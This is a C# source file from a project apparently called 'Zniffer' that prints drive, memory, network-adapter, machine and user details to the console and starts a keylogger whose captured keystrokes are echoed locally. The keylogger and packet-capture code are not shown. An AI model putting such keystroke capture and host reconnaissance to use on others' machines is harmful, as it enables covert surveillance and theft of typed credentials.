using System.IO;
using System.Net.Sockets;
using System.Threading;
using Zniffer.Network;
using System.Management;
using System;
using System.Net.NetworkInformation;

namespace Zniffer {
    public enum DebugLevels {
        NO_DEBUG = 0,
        CRITICAL = 1,
        ERROR = 2,
        WARNING = 3,
        ALL_IO = 4
    }
    class Sniffer {
        public static DebugLevels DEBUG_LEVEL = DebugLevels.CRITICAL;
        private Socket mainSocket;                          //The socket which captures all incoming packets
        private byte[] byteData = new byte[4096];
        private bool bContinueCapturing = false;            //A flag to check if packets are to be captured or not

        public Thread keyLogger;

        public Sniffer() {
            //sprawdzenie systemów plików // czy jest ntfs lub inne
            foreach (DriveInfo d in DriveInfo.GetDrives()) {
                printLine("Drive {0}", d.Name);
                printLine("  Drive type: {0}", d.DriveType.ToString());
                if (d.IsReady == true) {
                    printLine("  Volume label: {0}", d.VolumeLabel);
                    printLine("  File system: {0}", d.DriveFormat);
                    printLine("  Available space to current user:{0, 15} bytes", d.AvailableFreeSpace.ToString());
                    printLine("  Total available space:          {0, 15} bytes", d.TotalFreeSpace.ToString());
                    printLine("  Total size of drive:            {0, 15} bytes ", d.TotalSize.ToString());
                }
            }

            //sprawdzenie czy jest karta graficzna


            //sprawdzenie ilosci ramu
            double amoutOfRam = new Microsoft.VisualBasic.Devices.ComputerInfo().TotalPhysicalMemory;
            double amountOfMBOfRam = amoutOfRam / 1024 / 1024;
            Console.WriteLine("" + amountOfMBOfRam);


            //sprawdzenie ile jest kart sieciowych
            NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface adapter in adapters) {
                string ipAddrList = string.Empty;
                IPInterfaceProperties properties = adapter.GetIPProperties();
                Console.WriteLine(adapter.Description);
                Console.WriteLine("  DNS suffix .............................. : {0}", properties.DnsSuffix);
                Console.WriteLine("  DNS enabled ............................. : {0}", properties.IsDnsEnabled);
                Console.WriteLine("  Dynamically configured DNS .............. : {0}", properties.IsDynamicDnsEnabled);
                Console.WriteLine();
                if (adapter.NetworkInterfaceType == NetworkInterfaceType.Ethernet && adapter.OperationalStatus == OperationalStatus.Up) {
                    foreach (UnicastIPAddressInformation ip in adapter.GetIPProperties().UnicastAddresses)
                        if (ip.Address.AddressFamily == AddressFamily.InterNetwork)
                            if (ipAddrList == string.Empty)
                                ipAddrList += ip.Address.ToString();
                            else
                                ipAddrList += "\n".PadRight(16, ' ') + ip.Address.ToString();
                    Console.WriteLine("Ip Addresses ".PadRight(16, ' ') + ipAddrList);
                }

            }

            Console.WriteLine();
            Console.WriteLine("User Domain Name: " + Environment.UserDomainName);
            Console.WriteLine("Machine Name: " + Environment.MachineName);
            Console.WriteLine("User Name " + Environment.UserName);
            


            //powolanie keyloggera
            var obj = new KeyLogger();
            obj.RaiseKeyCapturedEvent += new KeyLogger.keyCaptured(printTextInConsole);

        }

        public static void log(DebugLevels level, string format, params string[] values) {
            if (DEBUG_LEVEL >= level) {
                System.Console.Out.WriteLine(string.Format(format, values));
            }
        }

        public static void printLine(string format, params string[] values) {
            System.Console.Out.WriteLine(string.Format(format, values));
        }

        public static void printTextInConsole (string s) {

            if (s.Substring(0, 1).Equals("<") && s.Substring(s.Length-1, 1).Equals(">")) {//znaki specjalne
                ;
            } else {//zwykle znaki

                System.Console.Out.WriteLine(s);
            }
        }
    }
}
